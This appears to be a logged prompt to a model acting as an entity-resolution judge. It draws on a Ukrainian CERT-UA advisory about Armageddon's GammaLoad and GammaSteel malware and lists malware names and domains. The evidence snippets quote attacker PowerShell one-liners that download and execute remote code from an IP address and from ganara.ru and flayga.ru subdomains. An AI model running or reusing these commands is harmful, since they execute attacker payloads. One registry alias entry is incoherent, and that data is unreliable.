=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1, GammaLoad.PS1_v2]
E2. stage1.ps1
E3. z.ps1
E4. TRYxaEbX.ps1 [aka TRYxaEbX_2.ps1]
E5. stage2.ps1
E6. OUTSTEEL
E7. WinExe
E8. GraphSteel
E9. HTA file
E10. Test-ProxyLogon.ps1
E11. ConfuserEx
E12. .NET Framework
E13. python-requests
E14. FTPGetter
E15. MarsStealer
E16. GrimPlant
E17. JesterStealer
E18. HTM dropper
E19. Meterpreter
E20. needrestart
E21. Hashcat [aka dnscat, dnsmasq, nslookup]
E22. PowerShell [aka powershell.exe]
E23. wscript.exe
E24. 223329.exe
E25. POWERGAP
E26. 62ea.exe
E27. SPECTR.Shell
E28. ms-msdt.exe
E29. 966449.exe
E30. MS PowerPoint
E31. GammaSteel.NET
E32. HarvesterX
E33. PowerShell (powershell.exe)
E34. GammaSteel.PS1
E35. kopratiso.ru
E36. acteran.ru
E37. bilitora.ru
E38. fishitor.ru
E39. apoxipodes.ru
E40. dodortar.ru
E41. tiloraso.ru
E42. a0322810.xsph.ru
E43. billyhot.ru
E44. dod-upload.dodortar.ru
E45. candidar.ru
E46. lnk-upload.dodortar.ru
E47. arentuk.com
E48. motocheck.in
E49. stormpredictor.host
E50. nitikora.ru
E51. meteolink.host
E52. xsph.ru
E53. successilin.top
E54. moskeet.com
E55. erwini.ru
E56. mulleti.ru
E57. bul-opros.top
E58. iol.pt
E59. toknowall.com
E60. gopoppers.com
E61. podologaneri.it
E62. co-opros.top
E63. districoperav.icu
E64. potrakit.ru
E65. giraffe-tour.ru
E66. rivierafamily.com
E67. mx-out-14.default-host.net
E68. tridiuma.ru
E69. yandex.ru
E70. varanasiclick.ru
E71. olei.ro
E72. jevejosader.top
E73. enlamentedeunasesor.com
E74. milotrad.ru
E75. milotraf.ru
E76. s8.h.mchost.ru
E77. lingrevelat.com
E78. aspe.ro
E79. omyce.ru
E80. tortunas.ru
E81. pastebin.com
E82. leonardis.ru
E83. jokotras.ru
E84. afi-opros.top
E85. nikotod.ru
E86. mitraseo.hol.es
E87. parodadoca.ru
E88. marmaris.com.ua
E89. nx0.ru
E90. ncscc.gov.ua
E91. rmssrv4.ru
E92. www.msftncsi.com
E93. rmssrv2.ru
E94. tas-gos.top
E95. staystrongjewels.com
E96. wi-opros.top
E97. xcasinobonuses.net
E98. viewdns.net
E99. servebeer.com
E100. evil.server.com
E101. 3utilities.com
E102. gotdns.ch
E103. agreminj.com
E104. icanhazip.com
E105. airmauritiusticket.com
E106. whoer.net
E107. plexbd.net
E108. bounceme.net
E109. ddns.net
E110. sytes.net
E111. brunoboys.net
E112. dcshost.net
E113. ns.ns2-dns.com
E114. d-upl.ddns.net
E115. ns2-dns.com
E116. gov-ua.info
E117. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E118. ns.ns3-dns.com
E119. dyndns.com
E120. cloudflare-dns.com
E121. freedynamicdns.org
E122. www.facebook.com
E123. winchconstruction.com
E124. www.michiganmastereltiempo.com
E125. www.symantec.com
E126. fluoxi.com
E127. lesrochersblancs.com
E128. atlantar.ru
E129. motoristo.ru
E130. moolin.ru
E131. bubenci.ru
E132. callsol.ru
E133. clipperso.ru
E134. cooperi.ru
E135. detroito.ru
E136. farafauler.ru
E137. flayga.ru
E138. ganara.ru
E139. hawksi.ru
E140. hofsteder.ru
E141. kilitro.ru
E142. kurapat.ru
E143. lnasfe.ru
E144. lopasts.ru
E145. mafirti.ru
E146. metanat.ru
E147. mitlubald.ru
E148. paparat.ru
E149. pasamart.ru
E150. qkcew.ru
E151. rncsq.ru
E152. tarlit.ru
E153. tbwelo.ru
E154. wicksl.ru
E155. xcqef.ru
E156. nxkad.ru
E157. dnslookup.seowebchecker.com
E158. tools.nexcess.net
E159. viewdns.info
E160. www.portcheckers.com
E161. lover.printing82.detroito.ru
Mentions:
M1. "GammaSteel.PS1" (Software) — options: E1, E2, E3, E4 — ctx: S1
